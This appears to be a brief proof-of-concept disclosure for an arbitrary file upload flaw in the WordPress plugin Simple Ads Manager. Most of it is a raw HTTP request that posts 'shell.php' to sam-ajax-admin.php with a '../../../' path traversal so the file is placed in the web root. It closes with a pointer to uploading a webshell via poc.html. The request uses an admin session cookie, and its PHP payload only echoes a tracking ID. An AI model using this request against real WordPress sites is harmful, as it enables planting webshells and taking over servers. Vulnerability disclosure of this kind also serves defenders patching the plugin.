Vuln URL: http://server/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php


Using burpsuite: //Shell in web root.
POST /wordpress/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------41184676334
Content-Length: 534
Cookie: wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1533195158%7CcafJWe92DI7ZzEsla3dNF4IFga5hy2dMkGPxQmx288z%7C168c305b99c627f03378a733829451813ae0682a47da1762ef81ee874ea67a5a; wp-settings-time-1=1532501796; wp-settings-1=unfold%3D1%26mfold%3Do; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1533195158%7CcafJWe92DI7ZzEsla3dNF4IFga5hy2dMkGPxQmx288z%7C7431d734014f15f77972c30493f0cde9f531df486134a45111763412447c6e41
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------41184676334
Content-Disposition: form-data; name="uploadfile"; filename="shell.php"
Content-Type: application/octet-stream

<?php echo('VT-2018-00767');?>
-----------------------------41184676334
Content-Disposition: form-data; name="action"

upload_ad_image
-----------------------------41184676334
Content-Disposition: form-data; name="path"

../../../
-----------------------------41184676334
Content-Disposition: form-data; name="submit"

Upload Image
-----------------------------41184676334--

Using poc.html: => choose and upload webshell